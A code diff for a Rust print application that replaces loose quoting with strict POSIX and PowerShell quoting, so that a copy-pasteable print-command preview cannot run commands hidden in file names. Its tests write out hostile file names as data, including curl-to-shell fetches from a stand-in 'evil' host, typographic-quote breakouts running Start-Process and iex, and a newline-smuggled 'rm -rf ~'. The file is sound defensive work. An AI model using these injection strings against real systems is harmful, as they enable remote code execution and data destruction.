@@ -346,15 +346,18 @@ pub fn effective_settings<'a>(settings: &'a JobSettings, input_ext: &str) -> Cow
 
 /// The exact command MaeclyPrint will run, as a copy-pasteable string for the
 /// UI. It uses the same argument builders as [`spool`], so what the user sees is
-/// what actually runs — on Windows the SumatraPDF command, elsewhere the CUPS
-/// `lp` command.
+/// what actually runs — on Windows the SumatraPDF command (written for
+/// PowerShell), elsewhere the CUPS `lp` command (written for a POSIX shell).
 ///
 /// Two details that keep "copy-pasteable" true rather than nearly true:
 ///
-/// - an option value containing spaces (`InputSlot=Tray 2`) is quoted, so the
-///   line pasted into a shell is the same *argument vector* the engine spawns
-///   instead of one that silently splits into two arguments; and
-/// - a setting the backend cannot express is appended as a comment
+/// - every argument a shell would split, expand or interpret is quoted
+///   ([`posix_quote`], [`powershell_quote`]), so the pasted line is the same
+///   *argument vector* the engine spawns. File names come from the outside
+///   world (`x$(curl evil|sh).pdf` is a legal download name), so this is a
+///   safety property, not just legibility: pasting the preview must never run
+///   anything but the print command; and
+/// - a setting the backend cannot express is appended as a `#` comment
 ///   ([`sumatra::quality_note`]) rather than left unsaid — the panel's job is to
 ///   tell the user what will happen, including what will not.
 ///
@@ -377,14 +380,17 @@ pub fn preview_command(
     #[cfg(windows)]
     {
         let _ = caps;
-        // Same resolution as `sumatra::spool`: the printer's saved default
-        // tray shows up here exactly when it will be sent.
+        // Same resolution and the same argument builder as `sumatra::spool`:
+        // the printer's saved default tray shows up here exactly when it will
+        // be sent.
         let resolved = sumatra::resolve_for_printer(settings, printer);
         let settings: &JobSettings = &resolved;
-        let cmd = format!(
-            "SumatraPDF.exe -print-to \"{printer}\" -print-settings \"{}\" -silent -exit-when-done \"{pdf_display}\"",
-            sumatra::print_settings_string(settings)
-        );
+        let args = sumatra::sumatra_args(printer, settings, std::path::Path::new(&pdf_display));
+        let cmd = std::iter::once("SumatraPDF.exe")
+            .chain(args.iter().map(String::as_str))
+            .map(powershell_quote)
+            .collect::<Vec<_>>()
+            .join(" ");
         std::iter::once(cmd)
             .chain(sumatra::unsupported_notes(settings))
             .collect::<Vec<_>>()
@@ -403,29 +409,75 @@ pub fn preview_command(
         );
         let rendered = args
             .iter()
-            .map(|a| shell_quote(a))
+            .map(|a| posix_quote(a))
             .collect::<Vec<_>>()
             .join(" ");
         format!("lp {rendered}")
     }
 }
 
-/// Wrap `arg` in double quotes when it contains whitespace or a character a
-/// shell would treat specially (`<converted PDF of …>`), so a preview line
-/// pastes into a shell as the same argument vector. Values are file, printer
-/// and driver-supplied names, not user shell input; the quoting is for
-/// legibility and fidelity, not for safety (nothing here is ever run through a
-/// shell).
-#[cfg_attr(windows, allow(dead_code))]
-fn shell_quote(arg: &str) -> Cow<'_, str> {
-    if arg
-        .chars()
-        .any(|c| c.is_whitespace() || matches!(c, '<' | '>' | '|' | '&' | ';'))
-    {
-        Cow::Owned(format!("\"{arg}\""))
-    } else {
+/// Characters that mean nothing special to a POSIX shell, so a word made only
+/// of them is left bare (the common case stays readable). Matches
+/// `quoteShellArg` in `src/lib/format.ts`.
+fn posix_safe(c: char) -> bool {
+    c.is_ascii_alphanumeric()
+        || matches!(c, '_' | '-' | '.' | '/' | '=' | ':' | '@' | '%' | '+' | ',')
+}
+
+/// Quote `arg` for a POSIX shell so it reaches the program verbatim.
+///
+/// Single quotes are the only quoting that turns every expansion off (`$`,
+/// backticks, `\`, globs, `!`); an inner `'` closes the string, is escaped and
+/// reopens it (`'\''`). A newline inside single quotes stays part of the word.
+pub fn posix_quote(arg: &str) -> Cow<'_, str> {
+    if !arg.is_empty() && arg.chars().all(posix_safe) {
         Cow::Borrowed(arg)
+    } else {
+        Cow::Owned(format!("'{}'", arg.replace('\'', r"'\''")))
     }
+}
+
+/// Every character PowerShell accepts as a single-quote delimiter: the ASCII
+/// apostrophe and the typographic U+2018, U+2019, U+201A and U+201B. Escaping
+/// only the ASCII one lets `’;Start-Process calc;’` close the string.
+const POWERSHELL_QUOTES: [char; 5] = ['\'', '\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}'];
+
+/// Characters that are inert in PowerShell argument mode. Narrower than the
+/// POSIX set on purpose: `@` splats, `,` builds an array, `%` and `+` can
+/// start expressions.
+fn powershell_safe(c: char) -> bool {
+    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/' | '=' | ':' | '\\')
+}
+
+/// Quote `arg` for PowerShell so it reaches the program verbatim.
+///
+/// A single-quoted string is never expanded (`$env:X`, `$(…)`, backticks are
+/// literal). Inside one, each of the five single-quote characters
+/// ([`POWERSHELL_QUOTES`]) must be doubled, which is what PowerShell's own
+/// `EscapeSingleQuotedStringContent` does.
+pub fn powershell_quote(arg: &str) -> Cow<'_, str> {
+    if !arg.is_empty() && arg.chars().all(powershell_safe) {
+        return Cow::Borrowed(arg);
+    }
+    let mut out = String::with_capacity(arg.len() + 2);
+    out.push('\'');
+    for c in arg.chars() {
+        if POWERSHELL_QUOTES.contains(&c) {
+            out.push(c);
+        }
+        out.push(c);
+    }
+    out.push('\'');
+    Cow::Owned(out)
+}
+
+/// Make `text` safe to put after a `#` comment marker in the preview: a line
+/// break (or any control character) in a file name would end the comment and
+/// turn the rest of the name into a command, so each becomes `?`.
+pub fn comment_text(text: &str) -> String {
+    text.chars()
+        .map(|c| if c.is_control() { '?' } else { c })
+        .collect()
 }
 
 /// Fill in what the job leaves to the printer from the per-printer defaults the
@@ -738,17 +790,112 @@ mod tests {
             assert!(pdf.ends_with(" report.pdf"), "{pdf}");
             assert!(img.contains("-t chart.png"), "{img}");
             assert!(
-                img.ends_with(" \"<converted PDF of chart.png>\""),
+                img.ends_with(" '<converted PDF of chart.png>'"),
                 "an image spools its converted PDF: {img}"
             );
         }
     }
 
     #[test]
-    fn shell_quote_only_wraps_multi_word_values() {
-        assert_eq!(shell_quote("media=A4"), "media=A4");
-        assert_eq!(shell_quote("InputSlot=Tray 2"), "\"InputSlot=Tray 2\"");
-        assert!(matches!(shell_quote("-o"), Cow::Borrowed(_)));
+    fn posix_quote_leaves_plain_words_bare_and_single_quotes_the_rest() {
+        assert_eq!(posix_quote("media=A4"), "media=A4");
+        assert!(matches!(posix_quote("-o"), Cow::Borrowed(_)));
+        assert_eq!(posix_quote("InputSlot=Tray 2"), "'InputSlot=Tray 2'");
+        assert_eq!(posix_quote(""), "''");
+        assert_eq!(posix_quote("Bob's.pdf"), r"'Bob'\''s.pdf'");
+    }
+
+    /// Reproduces the preview through a real POSIX shell: whatever the file
+    /// name, the pasted line hands `printf` back exactly the original words
+    /// and runs nothing else.
+    #[cfg(unix)]
+    #[test]
+    fn posix_quote_neutralises_command_substitution_in_a_real_shell() {
+        let dir = tempfile::tempdir().unwrap();
+        let canary = dir.path().join("pwned");
+        let c = canary.display();
+        let names = [
+            format!("x$(touch {c}).pdf"),
+            format!("a `touch {c}`.pdf"),
+            format!("a $(touch {c}) b.pdf"),
+            format!("q'$(touch {c})'.pdf"),
+            format!("d\"$(touch {c})\".pdf"),
+            "back\\slash $HOME !x *.pdf".to_string(),
+            format!("line\n$(touch {c})"),
+        ];
+        for name in &names {
+            let line = format!("printf '%s\\0' {}", posix_quote(name));
+            let out = std::process::Command::new("sh")
+                .arg("-c")
+                .arg(&line)
+                .output()
+                .unwrap();
+            assert!(out.status.success(), "{line}");
+            assert_eq!(out.stdout, format!("{name}\0").into_bytes(), "{line}");
+            assert!(!canary.exists(), "pasting {line:?} ran a command");
+        }
+    }
+
+    /// PowerShell treats U+2018/2019/201A/201B as single quotes too, so every
+    /// one of them is doubled, not only the ASCII apostrophe.
+    #[test]
+    fn powershell_quote_doubles_every_single_quote_character() {
+        assert_eq!(powershell_quote("-print-to"), "-print-to");
+        assert_eq!(powershell_quote(r"C:\Docs\a.pdf"), r"C:\Docs\a.pdf");
+        assert_eq!(powershell_quote("Office 2"), "'Office 2'");
+        assert_eq!(powershell_quote(""), "''");
+        assert_eq!(powershell_quote("Bob's"), "'Bob''s'");
+        assert_eq!(
+            powershell_quote("a\u{2019};Start-Process calc;\u{2019}"),
+            "'a\u{2019}\u{2019};Start-Process calc;\u{2019}\u{2019}'"
+        );
+        for q in ['\u{2018}', '\u{2019}', '\u{201A}', '\u{201B}'] {
+            assert_eq!(powershell_quote(&q.to_string()), format!("'{q}{q}'"));
+        }
+        // Expansion and splatting characters force quotes.
+        for s in ["$env:USERNAME", "@args", "a,b", "`n", "%x%", "$(calc)"] {
+            assert!(powershell_quote(s).starts_with('\''), "{s}");
+        }
+    }
+
+    /// Inside a quoted PowerShell string, an odd run of single-quote characters
+    /// is a delimiter. After quoting, every run inside the string is even, so
+    /// nothing a file name holds can close it early.
+    #[test]
+    fn powershell_quote_never_leaves_an_unpaired_quote_inside() {
+        let hostile = "x\u{2018}\u{2019}\u{201A}\u{201B}'$(calc)'\u{2019}; iex evil";
+        let q = powershell_quote(hostile);
+        let inner: Vec<char> = q.chars().collect();
+        let inner = &inner[1..inner.len() - 1];
+        let mut run = 0;
+        for &c in inner.iter().chain(std::iter::once(&'x')) {
+            if POWERSHELL_QUOTES.contains(&c) {
+                run += 1;
+            } else {
+                assert_eq!(run % 2, 0, "unpaired quote in {q}");
+                run = 0;
+            }
+        }
+    }
+
+    #[test]
+    fn comment_text_cannot_break_out_of_a_comment_line() {
+        assert_eq!(comment_text("a.pdf, b.png"), "a.pdf, b.png");
+        assert_eq!(comment_text("a\nrm -rf ~\r.pdf"), "a?rm -rf ~?.pdf");
+    }
+
+    /// The preview a user pastes must not run what a hostile file name holds.
+    #[test]
+    fn preview_quotes_hostile_file_names() {
+        let settings = JobSettings::default();
+        let name = "x$(curl${IFS}evil.sh|sh).pdf";
+        let cmd = preview_command(name, "Office", &settings, &PrinterCaps::unknown());
+        if cfg!(windows) {
+            assert!(cmd.contains("'x$(curl${IFS}evil.sh|sh).pdf'"), "{cmd}");
+        } else {
+            assert!(cmd.contains(" -t 'x$(curl${IFS}evil.sh|sh).pdf' "), "{cmd}");
+            assert!(cmd.ends_with(" 'x$(curl${IFS}evil.sh|sh).pdf'"), "{cmd}");
+        }
     }
 
     /// FR-041: whatever the user set for quality and tray has to be visible in
@@ -771,8 +918,8 @@ mod tests {
             assert!(cmd.contains("NOT applied"), "{cmd}");
         } else {
             // Multi-word values stay one argument when pasted into a shell.
-            assert!(cmd.contains("\"InputSlot=Tray 2\""), "{cmd}");
-            assert!(cmd.contains("\"media-source=Tray 2\""), "{cmd}");
+            assert!(cmd.contains("'InputSlot=Tray 2'"), "{cmd}");
+            assert!(cmd.contains("'media-source=Tray 2'"), "{cmd}");
             assert!(cmd.contains("print-quality=5"), "{cmd}");
             assert!(cmd.contains("cupsPrintQuality=High"), "{cmd}");
         }
